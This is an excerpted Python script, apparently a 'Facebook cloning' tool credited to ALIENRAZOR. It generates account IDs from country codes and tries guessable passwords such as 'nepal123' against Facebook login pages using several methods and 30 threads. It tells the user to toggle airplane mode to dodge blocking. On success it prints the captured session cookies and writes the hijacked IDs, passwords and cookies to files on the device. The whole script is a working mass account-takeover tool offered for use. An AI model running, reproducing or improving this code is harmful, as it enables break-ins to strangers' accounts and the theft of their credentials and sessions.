...
#open source by ALIENRAZOR
#github= ALIENRAZOR
# fb id https://www.facebook.com/profile.php?id=100037823461039
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/ALIENRAZOR-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
os.system("clear")
os.system("clear")
print("[❣️] JOIN MY FACEBOOK GROUP")
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Added to"," Added to"),N))
...
def ALIENRAZOR():
    ...
    print("\033[1;32m [1] NEPAL CLONING\n\033[1;32m [2] INDIA CLONING\n\033[1;32m [3] PAKISTAN CLONING \n\033[1;32m [4] BANGLADESH CLONING \n\033[1;32m [5] AFGHANISTAN CLONING \n")
    print('\033[0;96m──────────────────────────────────────────')
    aryan = input("✓CHOOSE>")
    if aryan =='1':ALIENRAZOR1()
    elif aryan =='2':ALIENRAZOR2()
    elif aryan =='3':ALIENRAZOR3()
    elif aryan =='4':ALIENRAZOR4()
    elif aryan =='5':ALIENRAZOR5()
    else:
...
def ALIENRAZOR1():
	...
	print("                CHOOSE METHOD                       ")
	print("\033[1;36m──────────────────────────────────────────") 
	print("\033[1;32m [1] METHOD 1- MBASIC\n\033[1;32m [2] METHOD 2- P\n\033[1;32m [3] METHOD 3- X\n\033[1;92m [4] METHOD 4- MOBILE\033[1;92m [5] METHOD 5- FREE\n")
	print('\033[0;96m──────────────────────────────────────────')
	ALIENRAZORfire = input("\033[1;37m [+] [CHOOSE] :- ")
	os.system("clear")
	print(logo)
	...
	print("\033[1;36m──────────────────────────────────────────") 
	ALIENRAZORlovesyou = input("\033[1;36m[+] [CHOOSE] :- ")
	if ALIENRAZORlovesyou in ['y','Y','1','yes','YES','Yes']:
		ALIENRAZOR_xd.append('y')
	else:
		ALIENRAZOR_xd.append('n')
	print("\033[1;36m──────────────────────────────────────────") 
	print("\033[1;36m( DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
	print("\033[1;36m──────────────────────────────────────────") 
	ALIENRAZORtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
	if ALIENRAZORtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'\033[1;37m METHOD CHOOSED : M{ALIENRAZORfire}')
		print("──────────────────────────────────────────");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print("\033[1;36m──────────────────────────────────────────")
		for guru in user:
			uid = kode+guru
			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
			if ALIENRAZORfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif ALIENRAZORfire =='2':yaari.submit(p,uid,pwx,tl)
			elif ALIENRAZORfire =='3':yaari.submit(x,uid,pwx,tl)
			elif ALIENRAZORfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif ALIENRAZORfire =='5':yaari.submit(free,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in ALIENRAZOR.txt,ALIENRAZOR-CP.txt')
...
def ALIENRAZOR2():
	...
	os.system("clear")
	print(logo)
	print("\033[1;36m                TRY SOMETHING NEW                       ")
	print("\033[1;36m──────────────────────────────────────────") 
	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
	print("\033[1;36m ──────────────────────────────────────────") 
	ALIENRAZORlovesyou = input("\033[1;36m [+] [CHOOSE] :- ")
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f"\033[1;36m [+] CODE CHOOSED : "+kode)
		print(f'\033[1;37m [+] METHOD CHOOSED : M{ALIENRAZORfire}')
		print("──────────────────────────────────────────");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print("──────────────────────────────────────────")
		for guru in user:
			uid = kode+guru
			mk = uid[:6]
			pwx = [guru]
...
def ALIENRAZOR4():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			elif ALIENRAZORfire =='5':yaari.submit(fre,uid,pwx,tl)
			else:
			    yaari.submit(p,uid,pwx,tl)
...
def mbasic(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[ALIENRAZOR-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in ALIENRAZOR_xd:
					print("\33[1;92m \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/ALIENRAZOR-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[ALIENRAZOR-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ALIENRAZOR-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/ALIENRAZOR-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-ALIENRAZOR] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-ALIENRAZOR] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;32m[ALIENRAZOR-OK] '+cid+'|'+ps+'~ '+Joined(uid)+'\33[0;97m')
				if 'y' in ALIENRAZOR_xd:
					print('\33[1;35m[NUMBER]━▷'+uid+' ━▷PASS ━▷'+ps+'\33[0;97m')
				if 'y' in ALIENRAZOR_xd:
				
					print("\33[0;97m\33[1;33mCOOKIES: \33[0;32m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HON3Y-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				open('/sdcard/ALIENRAZOR-CP.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-ALIENRAZOR] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-ALIENRAZOR] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-ALIENRAZOR] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[ALIENRAZOR-OK] '+uid+' | '+ps+'\33[0;97m')
				if 'y' in ALIENRAZOR_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[ALIENRAZOR-CP] '+uid+' | '+ps+'\33[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-ALIENRAZOR] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
